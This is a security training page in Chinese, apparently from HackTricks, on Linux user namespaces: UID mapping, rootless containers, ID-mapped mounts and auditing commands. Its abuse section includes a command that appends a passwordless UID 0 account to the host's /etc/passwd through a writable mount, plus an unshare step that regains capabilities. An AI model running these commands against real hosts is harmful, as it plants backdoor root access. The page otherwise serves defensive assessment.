# User Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

user namespace 通过允许内核将 namespace 内看到的用户和组 ID 映射到 namespace 外的不同 ID，改变了用户和组 ID 的含义。这是现代 container protection 中最重要的机制之一，因为它直接解决了经典 container 历史上最大的问题：**container 内的 root 曾经与 host 上的 root 过于接近**。

借助 user namespace，进程可以在 container 内以 UID 0 运行，同时在 host 上对应一个非特权 UID 范围。这意味着该进程可以像 root 一样执行许多 container 内的任务，但从 host 的角度看，其权限会小得多。这并不能解决所有 container security 问题，但会显著改变 container compromise 所造成的后果。

## 操作

user namespace 包含 `/proc/self/uid_map` 和 `/proc/self/gid_map` 等 mapping files，用于描述 namespace ID 如何转换为 parent ID。如果 namespace 内的 root 映射到 host 上的非特权 UID，那么原本需要真正的 host root 才能执行的操作，就不再具有相同的权限影响。这就是 user namespace 成为 **rootless containers** 核心机制的原因，也是早期 rootful container 默认配置与更现代的 least-privilege 设计之间最大的区别之一。

关键点很微妙，但至关重要：container 内的 root 并没有被消除，而是被**转换**了。进程在本地仍然处于类似 root 的环境中，但 host 不应将其视为完整的 root。

## 实验

手动测试如下：
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
这会让当前用户在命名空间内显示为 root，同时在命名空间外仍不是主机上的 root。这是理解 user namespaces 为什么如此有价值的最佳简单演示之一。

在 containers 中，你可以通过以下内容比较可见的映射：
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
确切的输出取决于 engine 使用的是 user namespace remapping，还是更传统的 rootful 配置。

你也可以从 host 端读取该映射：
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## 运行时使用

Rootless Podman 是将 user namespaces 视为一流 security mechanism 的最清晰示例之一。Rootless Docker 也依赖它们。Docker 的 userns-remap 支持也能提升 rootful daemon 部署的安全性，不过出于兼容性原因，历史上许多部署都将其禁用。Kubernetes 对 user namespaces 的支持已有所改进，但具体采用情况和默认设置会因 runtime、distro 及 cluster policy 而异。Incus/LXC 系统也严重依赖 UID/GID shifting 和 idmapping 思路。

总体趋势很明确：认真使用 user namespaces 的环境，通常比不使用它们的环境更能回答“container root 到底意味着什么？”这一问题。

## 高级映射细节

当 unprivileged process 向 `uid_map` 或 `gid_map` 写入时，kernel 会应用比 privileged parent namespace writer 更严格的规则。只允许有限的映射；对于 `gid_map`，writer 通常需要先禁用 `setgroups(2)`：
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
这一细节很重要，因为它解释了为什么 user namespace 设置有时会在 rootless 实验中失败，以及为什么 runtimes 需要围绕 UID/GID delegation 编写谨慎的 helper 逻辑。

另一个高级功能是 **ID-mapped mount**。它不会更改磁盘上的 ownership，而是将 user-namespace mapping 应用到 mount，使 ownership 在该 mount 的视图中呈现为经过转换的形式。这在 rootless 和现代 runtime 设置中尤其重要，因为它允许使用共享的 host paths，而无需执行递归 `chown` 操作。从安全角度看，该功能会改变 bind mount 从 namespace 内部看起来是否可写，尽管它不会重写底层 filesystem metadata。

最后，请记住：当进程创建或进入新的 user namespace 时，它会在**该 namespace 内部**获得完整的 capability 集合。这并不意味着它突然获得了 host-global power，而是意味着这些 capabilities 只能在 namespace 模型和其他保护机制允许的范围内使用。这正是 `unshare -U` 能够突然使 mount 或 namespace-local privileged operations 成为可能，却不会直接让 host root boundary 消失的原因。

## Misconfigurations

最主要的弱点，就是在本来可行的环境中不使用 user namespaces。如果 container root 过于直接地映射到 host root，那么可写的 host mounts 和 privileged kernel operations 会变得危险得多。另一个问题是，为了兼容性而强制共享 host user namespace，或禁用 remapping，却没有意识到这会在多大程度上改变 trust boundary。

还必须将 user namespaces 与模型的其余部分结合起来考虑。即使它们处于启用状态，广泛暴露的 runtime API 或非常薄弱的 runtime configuration，仍可能通过其他路径实现 privilege escalation。但如果没有它们，许多旧式 breakout 类别会更容易被 exploit。

## Abuse

如果 container 在没有 user namespace separation 的情况下以 rootful 模式运行，那么可写的 host bind mount 会变得危险得多，因为该进程可能实际上是以 host root 身份写入。危险的 capabilities 同样会变得更具实际影响。攻击者不再需要费力对抗 translation boundary，因为该边界几乎不存在。

在评估 container breakout path 时，应尽早检查是否存在 user namespace。它无法回答所有问题，但可以立即显示“root in container”是否对 host 具有直接意义。

最实用的 abuse pattern 是确认 mapping，然后立即测试 host-mounted content 是否能以 host-relevant privileges 写入：
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
如果该文件是以真实的 host root 身份创建的，那么对于该路径而言，user namespace 隔离实际上并不存在。此时，经典的 host 文件滥用就变得切实可行：
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
在 live assessment 中，更安全的确认方式是写入一个无害标记，而不是修改关键文件：
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
这些检查之所以重要，是因为它们能快速回答真正的问题：此 container 中的 root 是否与 host root 的映射足够接近，以至于一个可写的 host mount 会立即变成一条 host compromise 路径？

### 完整示例：重新获得 Namespace-Local Capabilities

如果 seccomp 允许 `unshare`，且环境允许创建一个新的 user namespace，那么该进程可能会在这个新 namespace 内重新获得完整的 capability 集合：
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
这本身并不是一次 host escape。之所以重要，是因为 user namespaces 可以重新启用特权的 namespace-local 操作，而这些操作随后可能与弱隔离的挂载、存在漏洞的内核或暴露不当的 runtime surfaces 结合。

## 检查

这些命令旨在回答本页面中最重要的问题：此容器内的 root 映射到 host 上的什么对象？
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
这里的重点是：

- 如果进程的 UID 为 0，且映射显示其对应于宿主机 root 或与宿主机 root 非常接近，那么该容器的危险性会高得多。
- 如果 root 映射到宿主机上的非特权范围，这是更安全的基线，通常表示真正的 user namespace 隔离。
- 映射文件比单独查看 `id` 更有价值，因为 `id` 只显示 namespace 内的身份。

如果工作负载以 UID 0 运行，且映射显示其对应的身份与宿主机 root 非常接近，则应更加严格地评估该容器的其他权限。
{{#include ../../../../../banners/hacktricks-training.md}}
